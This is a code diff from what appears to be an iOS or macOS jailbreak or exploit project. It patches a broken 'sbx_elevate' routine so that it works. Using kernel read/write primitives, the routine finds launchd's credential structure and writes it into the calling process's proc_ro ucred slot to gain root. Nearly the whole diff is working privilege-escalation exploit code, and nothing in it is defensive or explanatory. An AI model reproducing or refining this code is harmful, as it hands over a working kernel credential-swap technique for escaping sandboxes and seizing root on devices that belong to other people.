@@ -22,6 +22,7 @@
 #include "sbx.h"
 #include "utils.h"
 #include "darksword.h"
+#include "offsets.h"
 
 #define MAC_SYS_SANDBOX_EXTENSION_ISSUE 461
 
@@ -293,7 +294,6 @@ int sbx_escape(uint64_t self_proc) {
     return -1;
 }
 
-// broken
 int sbx_elevate(void) {
     uint64_t launchd = procbyname("launchd");
     if (!launchd && islcruntime()) {
@@ -306,14 +306,14 @@ int sbx_elevate(void) {
         sbx_log("could not find launchd");
         return -1;
     }
-    
+
     uint64_t launchducred = sbx_ucredbyproc(launchd);
     if (!launchducred) {
         sbx_log("failed to get valid ucred from launchd");
         return -1;
     }
     sbx_log("launchd ucred: 0x%llx", launchducred);
-    
+
     uint64_t self_proc = ds_get_our_proc();
     if (!self_proc && islcruntime()) {
         sbx_log("ds_get_our_proc() returned 0x0 during elevate; trying ourproc() fallback...");
@@ -324,18 +324,19 @@ int sbx_elevate(void) {
         return -1;
     }
     sbx_log("ourproc: 0x%llx", self_proc);
-    
-    uint64_t ourucredraw = ds_kread64(self_proc + 0x10);
-    uint64_t ourucred = S(ourucredraw);
-    sbx_log("ourucred: 0x%llx", ourucred);
-    
-    ds_kwrite64(self_proc + 0x10, launchducred);
-    
+
+    // Use proc_ro indirection for ucred instead of hardcoded 0x10
+    uint64_t proc_ro = ds_kread64(self_proc + off_proc_p_proc_ro);
+    uint64_t ourucred = ds_kread64(proc_ro + off_proc_ro_p_ucred);
+    sbx_log("ourucred (via proc_ro): 0x%llx", ourucred);
+
+    ds_kwrite64(proc_ro + off_proc_ro_p_ucred, launchducred);
+
     if (getuid() == 0) {
         sbx_log("elevate success!");
         return 0;
     }
-    
+
     sbx_log("elevate failed, uid: %d", getuid());
     return -1;
 }
